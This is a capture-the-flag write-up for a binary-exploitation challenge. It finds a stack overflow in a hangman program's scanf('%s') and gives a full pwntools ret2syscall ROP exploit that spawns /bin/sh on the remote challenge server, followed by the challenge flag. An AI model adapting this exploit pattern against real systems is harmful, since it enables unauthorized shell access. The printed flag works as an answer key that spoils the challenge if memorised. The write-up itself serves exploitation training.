# Hangman's Shell

nc 167.99.118.184 31339

## Challenge

Running checksec to see protections and file to see what we are working with:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

```
└─$ file hangman 
hangman: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=74b74744a0250e39b282af55405d6febb1720b1c, for GNU/Linux 3.2.0, not stripped
```

Once again we find a statically linked binary here with partial relro. We also have an executable stack, which I chose to ignore but could fairly easily be exploited.

```
└─$ ./hangman
***IMPORTANT***
This program is still a shell, code is still in development
A full game of hangman is unavailable at this time

Welcome to hangman v0.1!
Please select one of the following options:
1. Play hangman with preloaded options
2. Enter unique word and play hangman
3. Exit
2
Please enter a word: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
The word is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa.
zsh: segmentation fault  ./hangman
```
Playing with the binary for a second we can already find a buffer overflow.

We are also given source code so lets peak at it.
```c
#include <stdio.h>
#include <stdlib.h>
int gameSelection(int num)
{
	printf("Please select one of the following options:\n");
        printf("1. Play hangman with preloaded options\n");
        printf("2. Enter unique word and play hangman\n");
        printf("3. Exit\n");

	scanf("%d", &num);

	return num;
}

void playHangman(char word[])
{
	// Clear screen
	// Implement hangman game play. 
	printf("The word is %s.\n", word);
}

int main()
{
	// Implement 2D array to have more than one word to guess
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	char word[64] = "pwn";
	int num;

        printf("***IMPORTANT***\n");
        printf("This program is still a shell, code is still in development\n");
        printf("A full game of hangman is unavailable at this time\n\n");

	printf("Welcome to hangman v0.1!\n");
	num = gameSelection(num);
	if(num == 1)
	{
		playHangman(word);
	}
	else if(num == 2)
	{
		printf("Please enter a word: ");
		scanf("%s", &word);
		playHangman(word);
	}
	else if (num == 3)
	{
		printf("Thanks for playing!\n");
	}
	else
	{
		printf("Not a valid input.\n");
	}
	return 0;
}
```
Just browsing the code I can see our overflow:
```c
scanf("%s", &word);
```

So again, similar to the challenge secret runes, we can ret2syscall. We will find our appropriate gadgets and writable memory, and then just overflow into the return pointer and ROP.

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000001000 r-- /cyberopen/pwn/hangmans_shell/hangman
0x0000000000401000 0x00000000004b6000 0x00000000000b5000 r-x /cyberopen/pwn/hangmans_shell/hangman
0x00000000004b6000 0x00000000004e0000 0x000000000002a000 r-- /cyberopen/pwn/hangmans_shell/hangman
0x00000000004e1000 0x00000000004e8000 0x0000000000007000 rw- /cyberopen/pwn/hangmans_shell/hangman
0x00000000004e8000 0x00000000004ed000 0x0000000000005000 rw- [heap]
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000004000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 rwx [stack]
gef➤  
```
We can see that any address `0x00000000004e1000 - 0x00000000004ed000` is writable. So now we will execute our ret2syscall.

I wont go into detail on the attack but if you wish to learn more here is a [resource](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/rop-syscall-execv).

```python
from pwn import *

elf = context.binary = ELF('./hangman')
#p = process('./hangman')
p = remote('167.99.118.184', 31339)

p.sendlineafter(b'Exit\n', b'2')

#Offset to rip
offset = 88

#Gadgets used in ROP
pop_rdi = 0x00000000004023af # pop rdi ; ret
pop_rsi = 0x000000000040a41e # pop rsi ; ret
pop_rax_rdx_rbx = 0x00000000004a3c4a # pop rax ; pop rdx ; pop rbx ; ret
syscall = 0x0000000000402164 # syscall
writable_mem = 0x00000000004e8000
mov_rax_rdx_pop_rbx = 0x00000000004aa468 # mov qword ptr [rax], rdx ; pop rbx ; ret
ret = 0x0000000000446fb9 + 1 # ret

rop = b''
rop += p64(ret)

#Assigning rax writable memory address and rdx the string we want
rop += p64(pop_rax_rdx_rbx)
rop += p64(writable_mem) + b"/bin/sh\x00" + p64(0)

#Moving the string into writable memory for access
rop += p64(mov_rax_rdx_pop_rbx)
rop += p64(0)

#Rax to 0x3b for execve, rdx to 0
rop += p64(pop_rax_rdx_rbx)
rop += p64(0x3b) + p64(0) + p64(0)

#rdi to our /bin/sh and rsi to 0
rop += p64(pop_rdi)
rop += p64(writable_mem)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(syscall)

#Sendoff
payload = b'A'*offset + rop
p.sendline(payload)
p.interactive()
```

Running this script sets the binary up to execute the syscall and pop a shell. 

Looking at the flag I believe the intended solution was to utilize shellcode.

## Flag

`SIVBGR{sh3llc0d3_t0_pwn_n0_g4m3}`